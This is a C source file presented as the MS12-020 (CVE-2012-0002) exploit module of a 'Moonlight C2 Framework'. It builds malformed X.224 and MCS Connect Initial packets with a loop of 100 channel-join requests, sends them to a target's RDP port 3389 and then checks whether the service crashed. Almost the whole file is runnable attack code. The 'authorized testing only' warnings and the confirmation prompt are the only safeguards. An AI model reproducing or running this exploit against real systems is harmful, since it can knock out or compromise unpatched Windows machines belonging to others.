/*
 * Moonlight C2 Framework - MS12-020 Exploit Module
 * CVE-2012-0002 - Windows RDP Remote Code Execution
 * Target: Windows XP, Vista, 7, Server 2003/2008
 * Type: Remote DoS / Code Execution
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define RDP_PORT 3389

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS12-020 Exploit Module\n");
    printf("CVE-2012-0002 - RDP Remote Code Execution\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

unsigned char* build_rdp_exploit(size_t* out_size) {
    // X.224 Connection Request
    unsigned char x224_req[] = 
        "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00";
    
    // MCS Connect Initial with vulnerability trigger
    unsigned char mcs_connect[] = 
        "\x03\x00\x01\xca\x02\xf0\x80\x7f\x65\x82\x01\xbe\x04\x01\x01\x04"
        "\x01\x01\x01\x01\xff\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02"
        "\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02"
        "\x02\xff\xff\x02\x02\x00\x02";
    
    // Channel join requests (trigger vulnerability with large number)
    unsigned char channel_join[] = 
        "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x00\x03\xeb";
    
    size_t total_size = sizeof(x224_req) - 1 + sizeof(mcs_connect) - 1 + 
                       (sizeof(channel_join) - 1) * 100;  // Send 100 joins
    
    unsigned char* buffer = (unsigned char*)malloc(total_size);
    if (!buffer) return NULL;
    
    int pos = 0;
    
    // X.224 connection request
    memcpy(buffer + pos, x224_req, sizeof(x224_req) - 1);
    pos += sizeof(x224_req) - 1;
    
    // MCS connect
    memcpy(buffer + pos, mcs_connect, sizeof(mcs_connect) - 1);
    pos += sizeof(mcs_connect) - 1;
    
    // Multiple channel joins (triggers the bug)
    for (int i = 0; i < 100; i++) {
        memcpy(buffer + pos, channel_join, sizeof(channel_join) - 1);
        // Modify channel ID
        buffer[pos + 8] = (i >> 8) & 0xFF;
        buffer[pos + 9] = i & 0xFF;
        pos += sizeof(channel_join) - 1;
    }
    
    *out_size = pos;
    return buffer;
}

BOOL check_rdp_port(const char* target_ip) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(RDP_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    // Set connection timeout
    DWORD timeout = 3000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    printf("[*] Checking RDP port %d...\n", RDP_PORT);
    
    BOOL result = (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0);
    
    closesocket(sock);
    WSACleanup();
    
    return result;
}

BOOL exploit_ms12020(const char* target_ip) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    unsigned char* exploit_buffer;
    size_t exploit_size;
    unsigned char response[4096];
    
    printf("[*] Target: %s\n", target_ip);
    
    if (!check_rdp_port(target_ip)) {
        printf("[!] RDP port not accessible\n");
        return FALSE;
    }
    
    printf("[+] RDP port is open\n");
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(RDP_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("[*] Connecting to RDP service...\n");
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected to RDP\n");
    printf("[*] Building exploit buffer...\n");
    
    exploit_buffer = build_rdp_exploit(&exploit_size);
    if (!exploit_buffer) {
        printf("[!] Failed to build exploit\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[*] Exploit size: %zu bytes\n", exploit_size);
    printf("[*] Sending malformed RDP packets...\n");
    
    int sent = send(sock, (char*)exploit_buffer, exploit_size, 0);
    if (sent < 0) {
        printf("[!] Send failed\n");
        free(exploit_buffer);
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Sent %d bytes\n", sent);
    printf("[*] Waiting for response...\n");
    
    // Try to receive response
    int received = recv(sock, (char*)response, sizeof(response), 0);
    if (received > 0) {
        printf("[+] Received %d bytes\n", received);
    } else if (received == 0) {
        printf("[+] Connection closed by target (possible crash)\n");
    } else {
        printf("[!] No response (target may be affected)\n");
    }
    
    free(exploit_buffer);
    closesocket(sock);
    
    // Try to reconnect to check if service crashed
    Sleep(2000);
    printf("[*] Checking if RDP service crashed...\n");
    
    if (!check_rdp_port(target_ip)) {
        printf("[+] RDP service appears to have crashed!\n");
        printf("[+] Exploit successful (DoS)\n");
    } else {
        printf("[-] RDP service still responding\n");
        printf("[*] Target may be patched or not vulnerable\n");
    }
    
    WSACleanup();
    return TRUE;
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        printf("Usage: %s <target_ip>\n\n", argv[0]);
        printf("This exploit tests for MS12-020 vulnerability (RDP DoS/RCE)\n");
        printf("WARNING: May crash the target system!\n\n");
        return 1;
    }
    
    const char* target_ip = argv[1];
    
    printf("[!] WARNING: This may crash the target RDP service\n");
    printf("[!] Ensure you have authorization to test this system\n");
    printf("[*] Press Enter to continue or Ctrl+C to abort...\n");
    getchar();
    
    printf("\n[*] Starting MS12-020 exploitation\n");
    
    if (exploit_ms12020(target_ip)) {
        printf("\n[+] Exploitation attempt completed\n");
        return 0;
    } else {
        printf("\n[!] Exploitation failed\n");
        return 1;
    }
}
